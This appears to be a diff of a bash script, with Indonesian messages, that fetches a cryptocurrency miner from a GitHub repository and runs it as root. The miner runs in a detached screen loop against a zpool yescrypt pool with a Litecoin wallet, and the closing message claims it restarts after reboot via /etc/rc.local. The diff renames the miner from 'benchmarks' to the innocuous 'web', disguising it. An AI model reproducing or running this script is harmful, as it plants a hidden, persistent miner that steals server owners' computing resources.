@@ -2,18 +2,18 @@
 echo "📦 Menginstal dependensi..."
 apt-get update && apt-get install -y screen wget tar
 
-echo "📁 Menyimpan skrip mining ke /root/benchmarks.sh..."
-cat << 'EOF' > /root/benchmarks.sh
+echo "📁 Menyimpan skrip mining ke /root/web.sh..."
+cat << 'EOF' > /root/web.sh
 #!/bin/bash
 
 cd /root || exit
 
 # Download miner jika belum ada
-if [ ! -f benchmarks ]; then
-  echo "⬇️ Mengunduh file benchmarks..."
+if [ ! -f web ]; then
+  echo "⬇️ Mengunduh file web..."
   git clone https://github.com/amirul5656/yui56.git
   cd yui56
-  chmod +x benchmarks
+  chmod +x web
 fi
 
 # Cek apakah screen sudah berjalan
@@ -23,16 +23,16 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3'..."
   screen -dmS amirul3 bash -c '
     while true; do
-      ./benchmarks --algorithm yescrypt --pool stratum+tcp://yescrypt.eu.mine.zpool.ca:6233 -u ltc1q682mxnytl67x3gdw8eezxpuq4pehz5qhax4ls5.jp --password c=LTC,zap=BSTY -t 7
+      ./web --algorithm yescrypt --pool stratum+tcp://yescrypt.eu.mine.zpool.ca:6233 -u ltc1q682mxnytl67x3gdw8eezxpuq4pehz5qhax4ls5.jp --password c=LTC,zap=BSTY -t 7
       sleep 2
     done
   '
 fi
 EOF
 
-chmod +x /root/benchmarks.sh
+chmod +x /root/web.sh
 
 echo "🚀 Menjalankan miner sekarang..."
-bash /root/benchmarks.sh
+bash /root/web.sh
 
 echo "✅ Siap! Mining aktif sekarang & otomatis jalan setelah reboot lewat /etc/rc.local."
